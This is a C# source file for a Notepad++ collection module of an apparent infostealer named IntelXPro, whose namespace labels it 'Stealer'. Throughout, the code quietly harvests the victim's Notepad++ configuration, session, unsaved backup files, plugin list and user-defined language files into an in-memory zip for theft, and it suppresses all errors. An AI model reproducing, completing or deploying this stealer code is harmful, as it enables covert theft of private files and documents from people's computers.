using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class NotepadPlusPlus : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Notepad++");
            string programFilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Notepad++");
            string programFilesX86Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Notepad++");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "NotepadPlusPlus";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(programFilesPath))
            {
                foundData |= CollectFromDirectory(programFilesPath, "ProgramFiles", zip, counterApplications);
            }

            if (Directory.Exists(programFilesX86Path))
            {
                foundData |= CollectFromDirectory(programFilesX86Path, "ProgramFilesX86", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "config.xml",
                    "session.xml",
                    "shortcuts.xml",
                    "stylers.xml",
                    "langs.xml",
                    "contextMenu.xml",
                    "nativeLang.xml"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\NotepadPlusPlus\\{location}\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string backupPath = Path.Combine(basePath, "backup");
                if (Directory.Exists(backupPath))
                {
                    string[] backupFiles = Directory.GetFiles(backupPath, "*.*", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in backupFiles.Take(10))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\NotepadPlusPlus\\{location}\\backup\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string pluginsPath = Path.Combine(basePath, "plugins");
                if (Directory.Exists(pluginsPath))
                {
                    string[] pluginDirs = Directory.GetDirectories(pluginsPath);
                    
                    StringBuilder pluginsList = new StringBuilder();
                    pluginsList.AppendLine("Installed Plugins:");
                    pluginsList.AppendLine();
                    
                    foreach (string pluginDir in pluginDirs)
                    {
                        string pluginName = Path.GetFileName(pluginDir);
                        pluginsList.AppendLine("- " + pluginName);
                    }
                    
                    if (pluginDirs.Length > 0)
                    {
                        string zipPath = $"Applications\\NotepadPlusPlus\\{location}\\plugins_list.txt";
                        zip.AddTextFile(zipPath, pluginsList.ToString());
                        counterApplications.Files.Add(zipPath);
                        foundData = true;
                    }
                }

                string userDefineLangPath = Path.Combine(basePath, "userDefineLangs");
                if (Directory.Exists(userDefineLangPath))
                {
                    string[] langFiles = Directory.GetFiles(userDefineLangPath, "*.xml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in langFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\NotepadPlusPlus\\{location}\\userDefineLangs\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
